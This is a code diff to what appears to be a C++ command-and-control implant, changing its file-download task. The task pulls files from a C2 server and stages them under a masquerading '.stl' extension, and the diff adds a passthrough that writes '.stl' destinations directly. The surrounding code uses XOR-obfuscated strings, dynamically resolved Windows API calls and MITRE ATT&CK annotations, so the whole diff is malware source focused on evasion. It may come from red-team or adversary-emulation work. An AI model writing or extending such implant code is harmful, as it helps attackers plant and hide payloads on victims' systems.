@@ -244,6 +244,8 @@ DWORD PerformExecTask(sh_context* ctx, client_message* msg_buf, server_response*
  *          Downloads file from C2 server and writes it to disk. The download is
  *          staged under a masquerading benign extension (<dest>.stl) and renamed
  *          in-process to the final destination path once the write completes.
+ *          When the destination itself already ends in .stl, the file is written
+ *          directly under that extension and no staging or rename occurs.
  *      Result:
  *          Returns 0 on success, otherwise some error code
  *      MITRE ATT&CK Techniques:
@@ -275,9 +277,28 @@ DWORD PerformFileDownloadTask(sh_context* ctx, client_message* msg_buf, server_r
     wchar_t final_path[MAX_PATH];
     pi_memcpy(final_path, ctx->command_buf, MAX_PATH * sizeof(wchar_t));
 
+    // Detect a benign-extension destination (.stl passthrough: write directly, no staging or rename)
+    size_t final_len = 0;
+    while (final_len < MAX_PATH && final_path[final_len] != L'\0') {
+        final_len++;
+    }
+    BOOL stl_dest = FALSE;
+    if (final_len >= 4) {
+        wchar_t c_dot = final_path[final_len - 4];
+        wchar_t c_s = final_path[final_len - 3];
+        wchar_t c_t = final_path[final_len - 2];
+        wchar_t c_l = final_path[final_len - 1];
+        stl_dest = (c_dot == L'.')
+            && (c_s == L's' || c_s == L'S')
+            && (c_t == L't' || c_t == L'T')
+            && (c_l == L'l' || c_l == L'L');
+    }
+
     // Masquerade staging: write download to <dest>.stl first, then rename in-process
-    pi_concat_wstrn(ctx->command_buf, MAX_CMD_LEN + 1, L".stl"_xor);
-    AesLogger::LogDebug(&(ctx->log_ctx), "Staging file to: %S"_xor, ctx->command_buf);
+    if (!stl_dest) {
+        pi_concat_wstrn(ctx->command_buf, MAX_CMD_LEN + 1, L".stl"_xor);
+        AesLogger::LogDebug(&(ctx->log_ctx), "Staging file to: %S"_xor, ctx->command_buf);
+    }
 
     // Open handle to staging file
     HANDLE h_dest = ctx->fp.shared_fp.fp_CreateFileW(
@@ -344,7 +365,7 @@ DWORD PerformFileDownloadTask(sh_context* ctx, client_message* msg_buf, server_r
     }
 
     // Rename staging file to the final destination path
-    if (result == ERROR_SUCCESS) {
+    if (result == ERROR_SUCCESS && !stl_dest) {
         if (!ctx->fp.shared_fp.fp_MoveFileExW(ctx->command_buf, final_path, MOVEFILE_REPLACE_EXISTING)) {
             result = ctx->fp.shared_fp.fp_GetLastError();
             AesLogger::LogError(&(ctx->log_ctx), "Failed to rename staging file to destination. Error code: %d"_xor, result);
